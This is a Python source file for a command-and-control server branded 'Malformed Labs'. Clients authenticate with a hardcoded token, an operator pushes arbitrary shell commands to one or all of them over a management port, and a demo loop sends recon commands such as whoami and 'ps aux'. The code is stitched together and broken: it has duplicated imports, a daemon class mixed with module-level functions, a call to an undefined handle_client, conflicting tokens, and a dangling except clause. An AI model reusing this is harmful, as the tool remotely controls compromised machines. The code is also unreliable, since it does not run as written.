#!/usr/bin/env python3
"""
Malformed Labs C2 Server (Daemon Mode)
Command and Control server that runs in background without interactive console
"""

import socket
import threading
import json
import time
import random
import string
import sys
import os
import signal
from datetime import datetime

# Configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 8888
MGMT_HOST = '0.0.0.0'
MGMT_PORT = 8889
AUTH_TOKEN = 'malformed_labs_c2_2024'

# Global variables
clients = {}
client_lock = threading.Lock()
server_running = True
start_time = time.time()
commands_sent = 0

import socket
import threading
import json
import time
import uuid
from datetime import datetime
import logging
import signal
import sys

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/c2server_daemon.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class C2ServerDaemon:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.clients = {}
        self.server_socket = None
        self.running = False
        
        # Simple authentication token
        self.auth_token = "malformed_labs_2025"
        
        # Setup signal handlers
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info(f"Received signal {signum}, shutting down...")
        self.stop()
        sys.exit(0)
        
    def start(self):
        """Start the C2 server daemon"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            logger.info(f"C2 Server Daemon started on {self.host}:{self.port}")
            logger.info("Waiting for client connections...")
            
            # Start status reporter thread
            status_thread = threading.Thread(target=self.status_reporter)
            status_thread.daemon = True
            status_thread.start()
            
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    logger.info(f"New connection from {address}")
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.error as e:
                    if self.running:
                        logger.error(f"Socket error: {e}")
                        
        except Exception as e:
            logger.error(f"Server start error: {e}")
        finally:
            self.cleanup()
    
    def status_reporter(self):
        """Periodically report server status"""
        while self.running:
            try:
                client_count = len(self.clients)
                logger.info(f"Server status: {client_count} clients connected")
                
                if client_count > 0:
                    for client_id, info in self.clients.items():
                        last_seen = info['last_seen'].strftime('%H:%M:%S')
                        logger.info(f"  Client {client_id}: {info['address']} (last seen: {last_seen})")
                
                time.sleep(60)  # Report every minute
            except Exception as e:
                logger.error(f"Status reporter error: {e}")
                break
    
    def handle_client(self, client_socket, address):
        """Handle individual client connection"""
        client_id = None
        try:
            # Initial handshake
            welcome_msg = {
                'type': 'handshake',
                'message': 'Malformed Labs C2 Server Daemon',
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(client_socket, welcome_msg)
            
            # Wait for client authentication
            auth_response = self.receive_message(client_socket)
            if not auth_response or not self.authenticate_client(auth_response):
                logger.warning(f"Authentication failed for {address}")
                client_socket.close()
                return
            
            # Generate client ID and register
            client_id = str(uuid.uuid4())[:8]
            client_info = {
                'id': client_id,
                'address': address,
                'socket': client_socket,
                'last_seen': datetime.now(),
                'info': auth_response.get('info', {})
            }
            self.clients[client_id] = client_info
            
            logger.info(f"Client {client_id} authenticated from {address}")
            logger.info(f"Client info: {client_info['info'].get('hostname', 'unknown')} ({client_info['info'].get('system', 'unknown')})")
            
            # Send confirmation
            auth_success = {
                'type': 'auth_success',
                'client_id': client_id,
                'message': 'Authentication successful'
            }
            self.send_message(client_socket, auth_success)
            
            # Handle client messages
            while self.running:
                message = self.receive_message(client_socket)
                if not message:
                    break
                
                self.process_client_message(client_id, message)
                self.clients[client_id]['last_seen'] = datetime.now()
                
        except Exception as e:
            logger.error(f"Client handler error for {address}: {e}")
        finally:
            if client_id and client_id in self.clients:
                del self.clients[client_id]
                logger.info(f"Client {client_id} disconnected")
            client_socket.close()
    
    def authenticate_client(self, auth_message):
        """Authenticate client connection"""
        if auth_message.get('type') != 'auth':
            return False
        
        token = auth_message.get('token')
        return token == self.auth_token
    
    def process_client_message(self, client_id, message):
        """Process incoming message from client"""
        msg_type = message.get('type')
        
        if msg_type == 'heartbeat':
            # Respond to heartbeat
            response = {
                'type': 'heartbeat_ack',
                'timestamp': datetime.now().isoformat()
            }
            self.send_to_client(client_id, response)
            
        elif msg_type == 'command_result':
            # Log command execution result
            command = message.get('command', 'unknown')
            result = message.get('result', '')
            success = message.get('success', False)
            
            logger.info(f"Client {client_id} executed '{command}': {'SUCCESS' if success else 'FAILED'}")
            if result:
                logger.info(f"Result: {result[:200]}...")  # Truncate long results
            
        elif msg_type == 'info_update':
            # Update client information
            if client_id in self.clients:
                self.clients[client_id]['info'].update(message.get('info', {}))
                logger.info(f"Client {client_id} info updated")
        
        else:
            logger.warning(f"Unknown message type '{msg_type}' from client {client_id}")
    
    def send_message(self, client_socket, message):
        """Send JSON message to client"""
        try:
            data = json.dumps(message).encode('utf-8')
            length = len(data)
            client_socket.send(length.to_bytes(4, 'big'))
            client_socket.send(data)
        except Exception as e:
            logger.error(f"Send message error: {e}")
    
    def receive_message(self, client_socket):
        """Receive JSON message from client"""
        try:
            # Receive message length
            length_bytes = client_socket.recv(4)
            if len(length_bytes) != 4:
                return None
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Receive message data
            data = b''
            while len(data) < length:
                chunk = client_socket.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk
            
            return json.loads(data.decode('utf-8'))
        except Exception as e:
            logger.error(f"Receive message error: {e}")
            return None
    
    def send_to_client(self, client_id, message):
        """Send message to specific client"""
        if client_id in self.clients:
            client_socket = self.clients[client_id]['socket']
            self.send_message(client_socket, message)
    
    def send_command_to_all_clients(self, command):
        """Send command to all connected clients (for demo purposes)"""
        message = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        
        for client_id in list(self.clients.keys()):
            try:
                self.send_to_client(client_id, message)
                logger.info(f"Sent command to client {client_id}: {command}")
            except Exception as e:
                logger.error(f"Failed to send command to client {client_id}: {e}")
    
def handle_management_client(mgmt_socket):
    """Handle management console connections"""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management console connected")
    
    try:
        while server_running:
            # Receive request length
            length_bytes = mgmt_socket.recv(4)
            if len(length_bytes) != 4:
                break
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Receive request data
            request_data = b''
            while len(request_data) < length:
                chunk = mgmt_socket.recv(length - len(request_data))
                if not chunk:
                    break
                request_data += chunk
            
            if len(request_data) != length:
                break
            
            try:
                request = json.loads(request_data.decode('utf-8'))
                response = process_management_request(request)
                
                # Send response
                response_data = json.dumps(response).encode('utf-8')
                response_length = len(response_data)
                mgmt_socket.send(response_length.to_bytes(4, 'big'))
                mgmt_socket.send(response_data)
                
            except json.JSONDecodeError:
                error_response = {'success': False, 'error': 'Invalid JSON'}
                response_data = json.dumps(error_response).encode('utf-8')
                response_length = len(response_data)
                mgmt_socket.send(response_length.to_bytes(4, 'big'))
                mgmt_socket.send(response_data)
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Management client error: {e}")
    finally:
        mgmt_socket.close()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management console disconnected")

def process_management_request(request):
    """Process management requests from console"""
    global commands_sent
    
    req_type = request.get('type')
    
    if req_type == 'list_clients':
        with client_lock:
            client_list = []
            for client_id, client_info in clients.items():
                client_list.append({
                    'id': client_id,
                    'address': f"{client_info['address'][0]}:{client_info['address'][1]}",
                    'info': client_info.get('info', {}),
                    'last_seen': client_info.get('last_seen', 'unknown')
                })
            return {'success': True, 'clients': client_list}
    
    elif req_type == 'send_command':
        client_id = request.get('client_id')
        command = request.get('command')
        
        if not client_id or not command:
            return {'success': False, 'error': 'Missing client_id or command'}
        
        with client_lock:
            if client_id not in clients:
                return {'success': False, 'error': f'Client {client_id} not found'}
            
            try:
                client_socket = clients[client_id]['socket']
                send_command_to_client(client_socket, command)
                commands_sent += 1
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📤 Console command sent to {client_id}: {command}")
                return {'success': True}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    elif req_type == 'broadcast_command':
        command = request.get('command')
        
        if not command:
            return {'success': False, 'error': 'Missing command'}
        
        with client_lock:
            if not clients:
                return {'success': False, 'error': 'No clients connected'}
            
            success_count = 0
            for client_id, client_info in clients.items():
                try:
                    send_command_to_client(client_info['socket'], command)
                    success_count += 1
                    commands_sent += 1
                except Exception as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to send to {client_id}: {e}")
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 📢 Console broadcast to {success_count} clients: {command}")
            return {'success': True, 'client_count': success_count}
    
    elif req_type == 'server_stats':
        uptime = time.time() - start_time
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        with client_lock:
            stats = {
                'status': 'running',
                'client_count': len(clients),
                'uptime': uptime_str,
                'commands_sent': commands_sent
            }
        
        return {'success': True, 'stats': stats}
    
    else:
        return {'success': False, 'error': f'Unknown request type: {req_type}'}

def management_server():
    """Run management server for console connections"""
    mgmt_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mgmt_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        mgmt_sock.bind((MGMT_HOST, MGMT_PORT))
        mgmt_sock.listen(5)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management server listening on {MGMT_HOST}:{MGMT_PORT}")
        
        while server_running:
            try:
                mgmt_sock.settimeout(1.0)
                client_sock, addr = mgmt_sock.accept()
                mgmt_thread = threading.Thread(target=handle_management_client, args=(client_sock,))
                mgmt_thread.daemon = True
                mgmt_thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if server_running:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Management server error: {e}")
                break
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to start management server: {e}")
    finally:
        mgmt_sock.close()

def demo_command_sender():
    """Send demo commands to all clients periodically"""
    demo_commands = [
        'whoami',
        'hostname', 
        'uptime',
        'ps aux | head -10',
        'df -h',
        'free -m'
    ]
    
    while server_running:
        time.sleep(120)  # Wait 2 minutes between demo commands
        
        if not server_running:
            break
            
        with client_lock:
            if clients:
                # Pick a random demo command
                command = random.choice(demo_commands)
                
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📤 Sending demo command to all clients: {command}")
                
                for client_id, client_info in clients.items():
                    try:
                        send_command_to_client(client_info['socket'], command)
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ Demo command sent to {client_id}")
                        commands_sent += 1
                    except Exception as e:
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to send demo command to {client_id}: {e}")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📭 No clients connected for demo command")

def send_command_to_client(client_socket, command):
    """Send command to a specific client"""
    try:
        message = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        data = json.dumps(message).encode('utf-8')
        length = len(data)
        client_socket.send(length.to_bytes(4, 'big'))
        client_socket.send(data)
        return True
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to send command: {e}")
        return False

def signal_handler(sig, frame):
    """Handle shutdown signals"""
    global server_running
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🛑 Received shutdown signal")
    server_running = False
    sys.exit(0)

def main():
    """Main server function"""
    global server_running
    
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🚀 Starting Malformed Labs C2 Server Daemon...")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 📡 C2 Server: {SERVER_HOST}:{SERVER_PORT}")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🖥️  Management: {MGMT_HOST}:{MGMT_PORT}")
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((SERVER_HOST, SERVER_PORT))
        server_socket.listen(10)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🎯 C2 server listening on {SERVER_HOST}:{SERVER_PORT}")
        
        # Start management server thread
        mgmt_thread = threading.Thread(target=management_server)
        mgmt_thread.daemon = True
        mgmt_thread.start()
        
        # Start demo command thread
        demo_thread = threading.Thread(target=demo_command_sender)
        demo_thread.daemon = True
        demo_thread.start()
        
        # Main server loop
        while server_running:
            try:
                server_socket.settimeout(1.0)
                client_socket, addr = server_socket.accept()
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔗 New connection from {addr}")
                
                client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
                client_thread.daemon = True
                client_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if server_running:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Server error: {e}")
                break
                
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Failed to start server: {e}")
    finally:
        server_socket.close()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🛑 C2 Server Daemon stopped")

if __name__ == "__main__":
    main()
    except KeyboardInterrupt:
        logger.info("Server interrupted")
        server.stop()
    
    logger.info("C2 Server Daemon shutdown complete.")